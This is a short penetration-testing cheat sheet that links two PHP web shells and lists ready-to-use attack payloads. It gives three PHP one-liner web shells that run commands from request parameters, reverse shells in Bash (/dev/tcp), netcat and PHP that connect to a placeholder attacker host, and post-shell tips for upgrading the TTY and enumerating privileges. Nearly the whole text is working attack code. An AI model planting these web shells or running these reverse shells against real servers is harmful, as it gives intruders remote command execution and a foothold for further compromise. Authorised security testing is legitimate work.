## **[p0wny-shell](https://github.com/flozz/p0wny-shell)**

A single-file, PHP shell. It can be used to quickly execute commands on a server when pentesting a PHP application. Use it with caution: this script represents a security risk for the server.

## **[b374k](https://github.com/b374k/b374k)**

A more feature-rich PHP web shell with file management and command execution, among other functionalities.

----
## PHP One‑Liners

- `<?php system($_GET["cmd"]); ?>`
- `<?=\`$_GET[0]\`; ?>`
- `<?php passthru($_REQUEST['c']); ?>`

## Common Reverse Shells

- Bash: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
- Netcat (if present): `nc -e /bin/bash ATTACKER PORT`
- PHP:
  ```php
  <?php
	$sock = fsockopen("YOUR_IP", 8001);
	$descriptors = array(
	    0 => $sock, // stdin
	    1 => $sock, // stdout
	    2 => $sock  // stderr
	);
	$proc = proc_open("/bin/sh -i", $descriptors, $pipes);
 ?>
```

## Post‑Shell Tips

- Upgrade TTY: `python3 -c 'import pty,os,pty;pty.spawn("/bin/bash")'`
    
- Export TERM: `export TERM=xterm-256color`
    
- Enumerate system: `uname -a`, `sudo -l`, `id`.
